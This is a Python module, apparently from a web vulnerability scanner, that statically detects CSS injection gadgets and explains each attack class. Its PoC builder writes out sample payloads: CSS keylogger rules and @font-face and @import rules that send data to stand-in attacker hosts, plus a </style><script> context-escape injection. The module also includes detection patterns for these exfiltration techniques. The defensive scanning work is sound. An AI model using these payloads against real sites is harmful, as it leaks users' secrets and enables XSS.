"""CSS Injection (CSSI) detection (Phase 30-1).

CSS Injection is a class of vulnerabilities where attacker-controlled
input is placed into a CSS context (a ``<style>`` block, a ``style=``
attribute, or a CSSOM property assignment) without proper escaping.
While CSSI does not directly execute JavaScript in modern browsers, it
enables several powerful attacks:

  1. **CSS context escape** -- when user input lands inside ``<style>``
     and the ``<`` character is not escaped, the attacker can close the
     ``</style>`` tag and inject arbitrary HTML/script.  This is a
     classic reflected/stored XSS vector that many scanners miss
     because they only test HTML/JS contexts.

  2. **Data exfiltration via @font-face + unicode-range** -- an
     attacker-injected ``@font-face`` rule with ``unicode-range`` causes
     the browser to fire one HTTP request per character of a secret
     (e.g. a CSRF token in ``input[value]``) to an attacker-controlled
     server, leaking the secret character-by-character.  This is a
     *silent* exfiltration that bypasses CSP ``script-src`` because no
     JS executes.

  3. **CSS selector attribute theft** -- ``input[value^="a"] { background:
     url(https://attacker/?a) }`` leaks whether an input's value starts
     with "a".  Chaining many selectors leaks the full secret.  This is
     the classic "CSS keylogger" attack against login forms.

  4. **@import injection** -- ``@import url(https://attacker/evil.css)``
     loads an attacker-controlled stylesheet that can mount attacks 2
     and 3, or execute JavaScript via ``javascript:`` URIs in legacy
     browsers.

  5. **CSSOM sink** -- ``element.style.cssText = userInput`` or
     ``element.style.background = userInput`` in JS.  When ``userInput``
     is user-controlled, this is a CSS injection sink.

  6. **javascript: URI in CSS** -- ``background: url(javascript:...)``
     executes script in legacy IE/old Edge.  Modern browsers ignore
     ``javascript:`` in CSS ``url()``, but the pattern is still a
     finding in mixed-browser environments.

  7. **-moz-binding / behavior** -- Firefox's ``-moz-binding: url(...)``
     and IE's ``behavior: url(...)`` can load XBL/HTC that execute
     script.  Removed in modern Firefox but still relevant for legacy.

This module performs STATIC analysis of a page's HTML and inline JS to
detect CSSI gadgets (sinks + exfiltration patterns).  Dynamic context-
escape verification (injecting ``</style><script>`` into a reflected
CSS parameter) is handled by the main scanner's ``css_context`` payload
family; this layer complements it by detecting the *gadgets* that make
CSSI exploitable even when reflection is not directly observable.
"""
from __future__ import annotations

import re
from typing import Any


# ---------------------------------------------------------------------------
# HTML parsing -- try BeautifulSoup, fall back to regex
# ---------------------------------------------------------------------------
try:
    from bs4 import BeautifulSoup  # type: ignore
    _HAS_BS4 = True
except ImportError:  # pragma: no cover -- bs4 is in requirements.txt
    _HAS_BS4 = False


# ---------------------------------------------------------------------------
# Patterns
# ---------------------------------------------------------------------------

# <style>...</style> blocks.  We capture the inner text to look for
# user-controlled reflection and exfiltration gadgets.
_STYLE_BLOCK_RE = re.compile(
    r"<style\b[^>]*>(.*?)</style>", re.IGNORECASE | re.DOTALL,
)

# style="..." attribute values (inline styles).
_STYLE_ATTR_RE = re.compile(
    r"\bstyle\s*=\s*(?:\"([^\"]*)\"|'([^']*)'|([^\s>]+))",
    re.IGNORECASE,
)

# CSSOM sinks in inline <script>: element.style.cssText = ..., .style.X = ...
# We match the property assignment pattern, not the value (the value is
# often a variable that may carry user input).
_CSSOM_SINK_RES = [
    (re.compile(
        r"\.style\.cssText\s*=", re.IGNORECASE,
    ), "cssom_cssText", "high",
     "element.style.cssText assignment -- CSSOM sink that can inject any "
     "CSS property including @import/url(javascript:)"),
    (re.compile(
        r"\.style\.background(?:-image)?\s*=", re.IGNORECASE,
    ), "cssom_background", "medium",
     "element.style.background assignment -- can inject url() pointing to "
     "attacker server (data exfil) or javascript: URI (legacy IE)"),
    (re.compile(
        r"\.style\.listStyle(?:-Image)?\s*=", re.IGNORECASE,
    ), "cssom_liststyle", "medium",
     "element.style.listStyle assignment -- can inject url() for data exfil"),
    (re.compile(
        r"\.style\.content\s*=", re.IGNORECASE,
    ), "cssom_content", "medium",
     "element.style.content assignment -- can inject arbitrary generated "
     "content (phishing / UI redress)"),
    (re.compile(
        r"\.style\.cursor\s*=", re.IGNORECASE,
    ), "cssom_cursor", "low",
     "element.style.cursor assignment -- can inject url() for data exfil "
     "(legacy IE cursor: url(javascript:))"),
    (re.compile(
        r"\.insertRule\s*\(", re.IGNORECASE,
    ), "cssom_insertrule", "high",
     "CSSStyleSheet.insertRule() -- can inject arbitrary CSS rule including "
     "@import / @font-face exfil gadgets"),
    (re.compile(
        r"\.insertRule\s*\(\s*[^)]*@import", re.IGNORECASE,
    ), "cssom_insertrule_import", "high",
     "insertRule() with @import -- loads attacker-controlled stylesheet"),
    (re.compile(
        r"document\.adoptedStyleSheets\s*=", re.IGNORECASE,
    ), "cssom_adoptedsheets", "medium",
     "document.adoptedStyleSheets assignment -- constructable stylesheet "
     "sink (modern browsers)"),
]

# CSS exfiltration gadgets inside <style> blocks or injected CSS.
# @font-face with unicode-range + external src:url().  The unicode-range
# and src may appear in either order, so we match the whole @font-face
# block and check for both properties inside it.
_FONT_FACE_BLOCK_RE = re.compile(
    r"@font-face\s*\{([^}]*)\}", re.IGNORECASE | re.DOTALL,
)
_FONT_FACE_UNICODE_RE = re.compile(
    r"unicode-range\s*:", re.IGNORECASE,
)
_FONT_FACE_URL_RE = re.compile(
    r"src\s*:\s*url\(", re.IGNORECASE,
)
_IMPORT_RE = re.compile(
    r"@import\s+(?:url\()?\s*['\"]?\s*((?:https?:|//|javascript:)[^\s'\")]+)",
    re.IGNORECASE,
)
_SELECTOR_EXFIL_RE = re.compile(
    r"(?:input|textarea|select|button)\b[^\{\}]*?\[(?:value|name|type|placeholder)"
    r"[~^$*|]?=\s*[\"']?[^)\{\}]*?\]\s*\{[^}]*?url\(",
    re.IGNORECASE | re.DOTALL,
)
_MOZ_BINDING_RE = re.compile(
    r"-moz-binding\s*:\s*url\(", re.IGNORECASE,
)
_BEHAVIOR_RE = re.compile(
    r"\bbehavior\s*:\s*url\(", re.IGNORECASE,
)
_CSS_JS_URI_RE = re.compile(
    r"url\(\s*['\"]?\s*javascript:", re.IGNORECASE,
)
_CSS_EXPRESSION_RE = re.compile(
    r"expression\s*\(", re.IGNORECASE,
)

# User-controlled reflection markers inside <style>.  The main scanner
# injects a marker token into parameters; if it appears inside a <style>
# block, the parameter is reflected into CSS context.  We also detect
# common server-side template placeholders ({{ }}, <%= %>, ${ }) that
# indicate user input is interpolated into CSS.
_TEMPLATE_PLACEHOLDER_RE = re.compile(
    r"\{\{[^}]*\}\}|<%[^>]*%>|\$\{[^}]*\}",
)

# Heuristic: a <style> block that contains both a CSS selector on a
# secret-bearing input AND a url() to an external host is a likely
# CSS keylogger.
_SECRET_INPUT_SELECTOR_RE = re.compile(
    r"(?:input|button)\b[^\{\}]*?\[(?:value|name)\s*[~^$*|]?=",
    re.IGNORECASE,
)
_EXTERNAL_URL_RE = re.compile(
    r"url\(\s*['\"]?\s*(?:https?:|//)", re.IGNORECASE,
)


# ---------------------------------------------------------------------------
# Analysis
# ---------------------------------------------------------------------------
def analyze_page(html: str, page_url: str | None = None,
                 extra_markers: list[str] | None = None) -> dict[str, Any]:
    """Analyze a page for CSS Injection gadgets and exfiltration patterns.

    Returns a dict with a ``violations`` list.  Each violation is a dict
    with keys: ``type``, ``severity``, ``title``, ``evidence``,
    ``resource_url`` (optional), ``line`` (optional).
    """
    violations: list[dict[str, Any]] = []
    if not html:
        return {"violations": violations, "page_url": page_url}

    # 1. <style> block analysis.
    for m in _STYLE_BLOCK_RE.finditer(html):
        block = m.group(1)
        start = m.start(1)
        line = html.count("\n", 0, start) + 1
        violations.extend(_analyze_css_block(block, line, page_url))

    # 2. Inline style="..." attribute analysis -- detect javascript: URI
    #    and expression() inside inline styles (rare but exploitable).
    for m in _STYLE_ATTR_RE.finditer(html):
        val = m.group(1) or m.group(2) or m.group(3) or ""
        if not val:
            continue
        if _CSS_JS_URI_RE.search(val):
            violations.append({
                "type": "css_javascript_uri",
                "severity": "medium",
                "title": "javascript: URI in inline style attribute",
                "evidence": f"style=\"{_truncate(val)}\" -- javascript: URI "
                            f"in CSS url() executes script in legacy IE",
                "line": html.count("\n", 0, m.start()) + 1,
            })
        if _CSS_EXPRESSION_RE.search(val):
            violations.append({
                "type": "css_expression",
                "severity": "medium",
                "title": "CSS expression() in inline style attribute",
                "evidence": f"style=\"{_truncate(val)}\" -- expression() "
                            f"executes script in IE < 11",
                "line": html.count("\n", 0, m.start()) + 1,
            })

    # 3. CSSOM sinks in inline <script> blocks.
    violations.extend(_analyze_cssom_sinks(html, page_url))

    # 4. CSS exfiltration gadgets anywhere in the page (including
    #    dynamically-built CSS strings in <script>).
    violations.extend(_analyze_exfil_gadgets(html, page_url))

    # 5. User-controlled reflection into <style> (template placeholders).
    for m in _STYLE_BLOCK_RE.finditer(html):
        block = m.group(1)
        if _TEMPLATE_PLACEHOLDER_RE.search(block):
            violations.append({
                "type": "css_template_reflection",
                "severity": "high",
                "title": "Template placeholder inside <style> block",
                "evidence": "User-controlled template variable ({{ }} / <%= %> "
                            "/ ${ }) interpolated into CSS context -- if the "
                            "value contains </style>, it escapes to HTML and "
                            "enables XSS",
                "line": html.count("\n", 0, m.start(1)) + 1,
            })

    # Deduplicate by (type, evidence-prefix).
    seen: set[str] = set()
    unique: list[dict[str, Any]] = []
    for v in violations:
        key = (v.get("type", ""), v.get("evidence", "")[:80])
        if key in seen:
            continue
        seen.add(key)
        unique.append(v)
    return {"violations": unique, "page_url": page_url}


def _analyze_css_block(block: str, line: int,
                       page_url: str | None) -> list[dict[str, Any]]:
    """Analyze a single <style> block body for CSSI patterns."""
    out: list[dict[str, Any]] = []
    # @font-face unicode-range exfil -- match each @font-face block and
    # check for BOTH unicode-range and src:url() (in any order).
    for ff in _FONT_FACE_BLOCK_RE.finditer(block):
        body = ff.group(1)
        if _FONT_FACE_UNICODE_RE.search(body) and _FONT_FACE_URL_RE.search(body):
            out.append({
                "type": "css_font_face_exfil",
                "severity": "high",
                "title": "@font-face unicode-range data exfiltration gadget",
                "evidence": "@font-face with unicode-range + external src:url() "
                            "detected -- can leak secrets character-by-character "
                            "via CSS-triggered HTTP requests (bypasses CSP "
                            "script-src)",
                "line": line,
            })
            break  # one per block is enough
    # @import from external/javascript.
    for imp_match in _IMPORT_RE.finditer(block):
        url = imp_match.group(1) if imp_match.lastindex else imp_match.group(0)
        out.append({
            "type": "css_import_injection",
            "severity": "high",
            "title": "@import loads external/attacker-controlled stylesheet",
            "evidence": f"@import directive loading external resource: "
                        f"{_truncate(url)}",
            "line": line + block.count("\n", 0, imp_match.start()),
        })
    # CSS selector attribute theft (CSS keylogger).
    if _SELECTOR_EXFIL_RE.search(block):
        out.append({
            "type": "css_selector_exfil",
            "severity": "high",
            "title": "CSS selector attribute theft (CSS keylogger)",
            "evidence": "CSS selector targeting input[value=...] with url() "
                        "callback -- leaks secret attributes character-by-"
                        "character to attacker server",
            "line": line,
        })
    # -moz-binding (legacy Firefox XBL).
    if _MOZ_BINDING_RE.search(block):
        out.append({
            "type": "css_moz_binding",
            "severity": "medium",
            "title": "-moz-binding: url() (legacy Firefox XBL script execution)",
            "evidence": "-moz-binding loads XBL binding that can execute "
                        "script in Firefox < 62",
            "line": line,
        })
    # behavior: url() (IE HTC).
    if _BEHAVIOR_RE.search(block):
        out.append({
            "type": "css_behavior",
            "severity": "medium",
            "title": "behavior: url() (IE HTC script execution)",
            "evidence": "behavior:url() loads HTC that can execute script "
                        "in IE < 11",
            "line": line,
        })
    # javascript: URI in CSS url().
    if _CSS_JS_URI_RE.search(block):
        out.append({
            "type": "css_javascript_uri",
            "severity": "medium",
            "title": "javascript: URI in CSS url()",
            "evidence": "url(javascript:...) in CSS executes script in "
                        "legacy IE/old Edge",
            "line": line,
        })
    # expression() (IE < 11).
    if _CSS_EXPRESSION_RE.search(block):
        out.append({
            "type": "css_expression",
            "severity": "medium",
            "title": "CSS expression() (IE < 11 script execution)",
            "evidence": "expression() in CSS executes arbitrary script in "
                        "IE < 11",
            "line": line,
        })
    return out


def _analyze_cssom_sinks(html: str,
                         page_url: str | None) -> list[dict[str, Any]]:
    """Detect CSSOM sink patterns in inline <script> blocks.

    When an insertRule() call contains @import, we report only the more
    specific ``cssom_insertrule_import`` type and suppress the generic
    ``cssom_insertrule`` for the same call (avoiding duplicate findings
    on the same code location).
    """
    out: list[dict[str, Any]] = []
    # Extract inline script bodies (skip external src=).
    for sm in re.finditer(
        r"<script\b(?![^>]*\bsrc\s*=)[^>]*>(.*?)</script>",
        html, re.IGNORECASE | re.DOTALL,
    ):
        script = sm.group(1)
        script_start = sm.start(1)
        # First pass: find all insertRule(@import) positions so we can
        # suppress the generic cssom_insertrule on those exact positions.
        import_positions: set[int] = set()
        for pattern, vtype, _sev, _desc in _CSSOM_SINK_RES:
            if vtype != "cssom_insertrule_import":
                continue
            for pm in pattern.finditer(script):
                import_positions.add(pm.start())
        for pattern, vtype, sev, desc in _CSSOM_SINK_RES:
            for pm in pattern.finditer(script):
                # Suppress generic cssom_insertrule when the same position
                # was already matched by cssom_insertrule_import.
                if vtype == "cssom_insertrule" and pm.start() in import_positions:
                    continue
                out.append({
                    "type": vtype,
                    "severity": sev,
                    "title": f"CSSOM sink: {vtype}",
                    "evidence": f"{desc} | context: "
                                f"{_truncate(script[max(0,pm.start()-30):pm.end()+30])}",
                    "line": html.count("\n", 0, script_start + pm.start()) + 1,
                })
    return out


def _analyze_exfil_gadgets(html: str,
                           page_url: str | None) -> list[dict[str, Any]]:
    """Detect CSS exfiltration gadgets that may be dynamically built.

    Looks for the combination of a secret-input selector and an external
    url() callback, which together form a CSS keylogger even when not
    inside a <style> block (e.g. built in JS and injected via insertRule).
    """
    out: list[dict[str, Any]] = []
    # Only report if BOTH a secret-input selector AND an external url()
    # appear in the same script/CSS region.
    for sm in re.finditer(
        r"<script\b(?![^>]*\bsrc\s*=)[^>]*>(.*?)</script>",
        html, re.IGNORECASE | re.DOTALL,
    ):
        script = sm.group(1)
        has_secret_selector = _SECRET_INPUT_SELECTOR_RE.search(script)
        has_external_url = _EXTERNAL_URL_RE.search(script)
        if has_secret_selector and has_external_url:
            out.append({
                "type": "css_dynamic_exfil_gadget",
                "severity": "high",
                "title": "Dynamic CSS exfiltration gadget in script",
                "evidence": "Script builds CSS containing both a secret-input "
                            "selector (input[value=...]) and an external url() "
                            "-- likely a CSS keylogger that exfiltrates form "
                            "field values to an attacker server",
                "line": html.count("\n", 0, sm.start(1)) + 1,
            })
            break  # one per page is enough
    return out


def _truncate(s: str, n: int = 120) -> str:
    """Truncate a string to n chars with ellipsis."""
    s = s.replace("\n", " ").strip()
    return s[:n] + "..." if len(s) > n else s


# ---------------------------------------------------------------------------
# PoC builder
# ---------------------------------------------------------------------------
def build_poc_html(url: str, violation_type: str,
                   resource_url: str = "") -> str:
    """Build a minimal PoC HTML snippet for the given violation type.

    The PoC demonstrates how an attacker would exploit the CSSI gadget.
    """
    if violation_type == "css_context_escape":
        return (
            f"<!-- Inject into a CSS-reflected parameter: -->\n"
            f"</style><script>alert('CSSI context escape on {url}')</script>\n"
            f"<style>/* restore style block */"
        )
    if violation_type == "css_font_face_exfil":
        return (
            f"<!-- @font-face unicode-range exfiltration PoC -->\n"
            f"<style>\n"
            f"@font-face {{\n"
            f"  font-family: exfil;\n"
            f"  src: url(https://attacker.example/?leak=1);\n"
            f"  unicode-range: U+0041; /* 'A' -- one request per char */\n"
            f"}}\n"
            f"/* Repeat for each character code; the browser fires one\n"
            f"   HTTP request per matching character in any element using\n"
            f"   this font.  Bypasses CSP script-src (no JS executes). */\n"
            f"</style>"
        )
    if violation_type == "css_selector_exfil":
        return (
            f"<!-- CSS keylogger PoC against {url} -->\n"
            f"<style>\n"
            f"input[value^=\"a\"] {{ background: url(https://attacker/?a); }}\n"
            f"input[value^=\"b\"] {{ background: url(https://attacker/?b); }}\n"
            f"/* ... one rule per character per position ... */\n"
            f"</style>"
        )
    if violation_type == "css_import_injection":
        return (
            f"<!-- @import PoC: load attacker-controlled stylesheet -->\n"
            f"<style>\n"
            f"@import url(https://attacker.example/evil.css);\n"
            f"</style>"
        )
    if violation_type in ("cssom_insertrule", "cssom_insertrule_import"):
        return (
            f"<!-- CSSOM insertRule PoC -->\n"
            f"<script>\n"
            f"// If user input reaches insertRule():\n"
            f"document.styleSheets[0].insertRule(\n"
            f"  '@import url(https://attacker.example/evil.css)', 0\n"
            f");\n"
            f"</script>"
        )
    if violation_type == "cssom_cssText":
        return (
            f"<!-- CSSOM cssText sink PoC -->\n"
            f"<script>\n"
            f"// If user input reaches element.style.cssText:\n"
            f"el.style.cssText = 'background:url(https://attacker/?leak=1)';\n"
            f"</script>"
        )
    if violation_type in ("css_javascript_uri", "css_expression",
                          "css_moz_binding", "css_behavior"):
        return (
            f"<!-- Legacy CSS script execution PoC ({violation_type}) -->\n"
            f"<style>\n"
            f"  body {{ {_legacy_payload(violation_type)} }}\n"
            f"</style>"
        )
    if violation_type == "css_template_reflection":
        return (
            f"<!-- Template reflection into <style> PoC -->\n"
            f"If the template variable contains '</style>', it escapes to\n"
            f"HTML context.  Inject:  </style><script>alert(1)</script><style>"
        )
    if violation_type == "css_dynamic_exfil_gadget":
        return (
            f"<!-- Dynamic CSS keylogger built in JS -->\n"
            f"<script>\n"
            f"var s = document.createElement('style');\n"
            f"s.textContent = 'input[value^=\"' + char + '\"] {{ "
            f"background:url(https://attacker/?' + char + ') }}';\n"
            f"document.head.appendChild(s);\n"
            f"</script>"
        )
    return f"<!-- CSSI PoC for {violation_type} on {url} -->"


def _legacy_payload(vtype: str) -> str:
    if vtype == "css_javascript_uri":
        return "background: url(javascript:alert(1))"
    if vtype == "css_expression":
        return "width: expression(alert(1))"
    if vtype == "css_moz_binding":
        return "-moz-binding: url(attacker.xml#xss)"
    if vtype == "css_behavior":
        return "behavior: url(xss.htc)"
    return ""
